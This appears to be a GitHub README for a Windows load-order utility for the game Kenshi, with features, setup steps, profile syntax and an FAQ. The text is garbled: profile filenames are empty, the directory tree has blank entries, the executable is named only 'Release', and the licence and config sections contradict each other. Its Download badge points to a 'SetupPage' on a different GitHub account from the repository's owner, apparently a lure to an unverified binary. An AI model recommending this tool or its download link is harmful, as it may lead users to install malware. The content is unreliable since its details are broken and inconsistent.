# Kenshi‑utility‑LoadOrder‑Optimizer

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-be185d?style=plastic&logo=files&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/teraofficialhatchet/Kenshi-utility-LoadOrder-Optimizer/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-2b2b2b?style=flat-square&logo=opensourceinitiative" alt="License">
  </a>
  <a href="https://github.com/teraofficialhatchet/Kenshi-utility-LoadOrder-Optimizer/releases">
    <img src="https://img.shields.io/badge/Version-1.3.0-0088cc?style=for-the-badge&logo=tag" alt="Version">
  </a>
  <a href="https://en.wikipedia.org/wiki/Windows_10">
    <img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=plastic&logo=windows" alt="Platform">
  </a>
  <a href="https://isocpp.org/">
    <img src="https://img.shields.io/badge/Language-C%2B%2B-00599C?style=for-the-badge&logo=cpp" alt="Language">
  </a>
  <a href="https://github.com/teraofficialhatchet/Kenshi-utility-LoadOrder-Optimizer/actions">
    <img src="https://img.shields.io/badge/Build-Passing-44CC11?style=flat&logo=github-actions" alt="Build">
  </a>
</p>

---

> **TL;DR** – Kenshi‑utility‑LoadOrder‑Optimizer is a lightweight, Windows‑only utility that builds deterministic load‑order sequences from structured configuration profiles. It ships with preset workflows, a visual preview engine, and a ready‑to‑run release bundle, enabling players to reproduce stable game starts with a single click.

---

## Why a dedicated LoadOrder Optimizer?

The native loader of *Kenshi* resolves file precedence purely by alphabetical order, which quickly becomes fragile when dozens of community contributions are stacked. Inconsistent ordering leads to missing textures, corrupted NPC data, or outright crashes. Kenshi‑utility‑LoadOrder‑Optimizer addresses these pain points by:

* **Profile‑driven ordering** – each profile (``, ``, ``, ``) defines a deterministic sequence that can be version‑controlled.
* **Preset pipelines** – common playstyles such as “Hardcore Survival”, “Graphic Overhaul”, or “Lightweight Sandbox” are shipped as ready‑made pipelines.
* **Conflict‑resolution engine** – the optimizer parses file headers, evaluates declared dependencies, and produces a conflict‑free ordering list.
* **One‑click bundle creation** – a final zip archive contains the ordered list, a checksum manifest, and a small launcher that injects the ordering into the game’s `loadorder.txt`.

---

## Core Features

| Feature | Description | Impact |
|---------|-------------|--------|
| Structured profiles | Human‑readable `.cfg` files with sections for `LoadFirst`, `LoadAfter`, and `LoadLast`. | Eliminates manual file renaming. |
| Dependency graph solver | Detects circular dependencies and suggests minimal adjustments. | Prevents hidden crashes. |
| Visual preview | Generates a color‑coded tree view of the final order. | Quick sanity check before launch. |
| Batch export | Produces a `loadorder.txt` and an optional `manifest.json`. | Simplifies sharing with teammates. |
| Command‑line mode | Supports silent operation for integration with external launchers. | Enables automation in utility managers. |
| Auto‑update check | Periodically pings the GitHub releases API and notifies about newer bundles. | Keeps the utility current without manual browsing. |

---

## Getting Started

1. **Download** the latest release bundle via the badge above. The zip contains the executable `Release`, a `profiles/` directory, and a small README.
2. **Extract** the archive to a location of your choice (e.g., `C:\Kenshi\LLO`).
3. **Select a profile** – copy one of the supplied `.cfg` files into the `profiles/` folder and rename it to match your playstyle.
4. **Run** `Release` – the UI will display the parsed ordering, highlight any conflicts, and offer a “Generate Bundle” button.
5. **Launch Kenshi** – the generated `loadorder.txt` will be automatically placed in the game’s root folder.

> **Note:** The utility does not modify any game files; it only writes the ordering manifest.

---

## Profile Syntax Reference

Each configuration file follows a strict INI‑like layout. Below is a concise reference for the four fixed filenames:

```
#
[LoadFirst]
# Files that must be loaded before everything else
basegame.ini
graphics_base.ini

[LoadAfter]
# Files that should appear after the first block but before the last
combat_balance.ini
faction_expansion.ini

[LoadLast]
# Files that must be loaded at the very end
ui_customizations.ini
```

* Sections may appear in any order, but the keys inside each must be unique.
* Comments begin with `#`.
* Paths are relative to the game’s `Data/` folder.

---

## Directory Layout

```
Kenshi‑utility‑LoadOrder‑Optimizer/
├─ Release                     # Main executable
├─ profiles/                   # Profile directory
│   ├─
│   ├─
│   ├─
│   └─
├─ docs/                       # Additional documentation
│   └─ troubleshooting.md
├─ assets/                     # Icons and sample screenshots
└─ README.md                   # This file
```

---

## FAQ & Troubleshooting

**Q: The visual preview shows a red node. What does it mean?**
A: Red indicates a circular dependency detected by the solver. Open the offending `.cfg`, locate the overlapping entries in `LoadAfter` and `LoadFirst`, and remove or reorder one of them.

**Q: My game still crashes after using the generated bundle.**
A: Verify that no third‑party launcher is overwriting `loadorder.txt`. Additionally, run `Release` in command‑line mode (`Release -v`) to view a detailed log saved as `klo.log`.

**Q: Can I use the optimizer on Linux via Wine?**
A: The current build is compiled for native Windows. Wine may run the executable, but file‑system case‑sensitivity can cause mismatches. We recommend Windows for production use.

**Q: How do I create a completely new profile?**
A: Duplicate ``, rename it (e.g., ``), and edit the sections to reflect your desired order. The UI will automatically recognize any file placed in `profiles/`.

---

## Contributing

Contributions are welcome. Fork the repository, make changes in a feature branch, and submit a pull request. Please keep the following guidelines in mind:

* Keep the profile format unchanged.
* Update the `CHANGELOG.md` for every public release.
* Ensure the documentation stays in sync with any new preset pipelines.

---

*© 2026 teraofficialhatchet – All rights reserved.*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```